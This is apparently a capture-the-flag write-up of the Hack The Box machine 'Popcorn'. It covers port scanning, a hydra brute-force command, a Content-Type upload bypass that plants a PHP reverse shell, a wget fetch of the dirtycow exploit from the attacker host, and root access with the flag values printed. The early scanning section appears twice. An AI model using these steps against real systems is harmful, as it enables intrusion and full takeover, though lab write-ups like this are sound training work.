# Popcorn

URL: https://app.hackthebox.com/machines/Popcorn

Level: Medium

Date 27 Jun 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.80 scan initiated Sun Jun 27 10:38:07 2021 as: nmap -p- -T4 -oN 01_nmap.txt 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Jun 27 10:38:33 2021 -- 1 IP address (1 host up) scanned in 26.69 seconds
```

```
# Nmap 7.80 scan initiated Sun Jun 27 10:39:24 2021 as: nmap -p22,80 -A -T4 -oN 02_nmap_withA.txt 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.32 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (95%), Android 2.3.5 (Linux 2.6) (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Linux 2.6.30 (94%), Linux 2.6.35 (94%), Epson WF-2660 printer (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.59 ms 10.10.14.1
2   43.23 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 27 10:39:38 2021 -- 1 IP address (1 host up) scanned in 14.98 seconds
```

We run `dirbuster` and we discover `/torrent` folder.

We capture our first attempt:

```
POST /torrent/login.php HTTP/1.1
Host: 10.10.10.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.6/torrent/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Cookie: /torrent/=; /torrent/index.php=; /torrent/torrents.php=; /torrent/login.php=; /torrent/torrents.phpfirsttimeload=1; PHPSESSID=4f6b28bd82717b32a62abde7b68df23a
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

So we can run bruteforce attack with `hydra`:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-form-post://10.10.10.6/torrent/login.php:username=^USER^&password=^PASS^:Invalid login" -v -V
```

We get no luck.

We simply register 
# Nmap 7.80 scan initiated Sun Jun 27 10:38:07 2021 as: nmap -p- -T4 -oN 01_nmap.txt 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.050s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sun Jun 27 10:38:33 2021 -- 1 IP address (1 host up) scanned in 26.69 seconds
```

```
# Nmap 7.80 scan initiated Sun Jun 27 10:39:24 2021 as: nmap -p22,80 -A -T4 -oN 02_nmap_withA.txt 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.32 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (95%), Android 2.3.5 (Linux 2.6) (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Linux 2.6.30 (94%), Linux 2.6.35 (94%), Epson WF-2660 printer (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   41.59 ms 10.10.14.1
2   43.23 ms 10.10.10.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 27 10:39:38 2021 -- 1 IP address (1 host up) scanned in 14.98 seconds
```

We run `dirbuster` and we discover `/torrent` folder.

We capture our first attempt:

```
POST /torrent/login.php HTTP/1.1
Host: 10.10.10.6
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.6/torrent/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close
Cookie: /torrent/=; /torrent/index.php=; /torrent/torrents.php=; /torrent/login.php=; /torrent/torrents.phpfirsttimeload=1; PHPSESSID=4f6b28bd82717b32a62abde7b68df23a
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

So we can run bruteforce attack with `hydra`:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-form-post://10.10.10.6/torrent/login.php:username=^USER^&password=^PASS^:Invalid login" -v -V
```

We get no luck.

We simply register.

We try to upload a torrent file:

![10_test_upload_again_torrent](https://user-images.githubusercontent.com/42389836/156936604-44161082-4f75-4aba-af39-bdcdb148fd29.png)

We try to upload a simple PHP reverse shell but it failed.

After some try, we can assume that the only check is made on `Content-Type`.

So, we upload a basic PHP reverse shell (Pentestmonkey) and thanks to Burpsuite we change Content-Type to: `image/png`.

Now, we can browse to `/torrent/upload` and gain our shell:

```
root@kaligra:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.6] 42961
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 18:01:59 up 22:28,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$
$
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# User-flag

We can easily grab user flag:

```
$ cd /home/
$ ls
george
$ cd george
$ ls
torrenthoster.zip
user.txt
$ cat user.txt
556b4aacd699043203716bea55e0b3b1
$
```

# Privesc

We upgrade our shell:

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@popcorn:/home/george$
```

We try dirtyc0w exploit:

```
$ wget http://10.10.14.7:8000/dirty.c
--2021-06-27 18:21:41--  http://10.10.14.7:8000/dirty.c
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/x-csrc]
Saving to: `dirty.c'

     0K ....                                                  100%  380M=0s

2021-06-27 18:21:41 (380 MB/s) - `dirty.c' saved [5006/5006]

```

We compile it:

```
$ gcc -pthread dirty.c -o dirty -lcrypt
```

and we run it:

```
$ ./dirty
Please enter the new password: mammete
```

Now we can access through SSH with user `firefart`:

```
joshua@kaligra:/opt/htb/Popcorn$ ssh firefart@10.10.10.6
firefart@10.10.10.6's password:
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/

  System information as of Sun Jun 27 18:26:28 EEST 2021

  System load: 3.21              Memory usage: 17%   Processes:       126
  Usage of /:  7.6% of 14.80GB   Swap usage:   0%    Users logged in: 0

  Graph this data and manage this system at https://landscape.canonical.com/

Last login: Tue Oct 27 11:08:55 2020
firefart@popcorn:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:~# ls
root.txt
firefart@popcorn:~# cat root.txt
6a941efb2e826e2f3f98b7f6841fc505
```

